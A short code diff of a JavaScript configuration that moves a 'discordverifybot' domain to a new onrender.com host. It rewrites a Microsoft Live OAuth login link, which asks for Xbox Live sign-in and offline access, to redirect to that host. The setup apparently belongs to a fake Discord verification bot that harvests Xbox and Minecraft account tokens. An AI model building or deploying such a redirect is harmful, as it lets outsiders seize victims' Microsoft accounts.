@@ -10,9 +10,9 @@ const config = {
     },
 
     site: {
-        handleDomain: "discordverifybot.onrender.com",
+        handleDomain: "rawroar.onrender.com",
         loginLive:
-            "https://login.live.com/oauth20_authorize.srf?client_id=4c5c7172-90b2-4c57-890e-f1a349074fe6&response_type=code&redirect_uri=https://discordverifybot.onrender.com/&scope=XboxLive.signin+offline_access&state=",
+            "https://login.live.com/oauth20_authorize.srf?client_id=4c5c7172-90b2-4c57-890e-f1a349074fe6&response_type=code&redirect_uri=https://rawroar.onrender.com/&scope=XboxLive.signin+offline_access&state=",
             // End with state=
     },
 
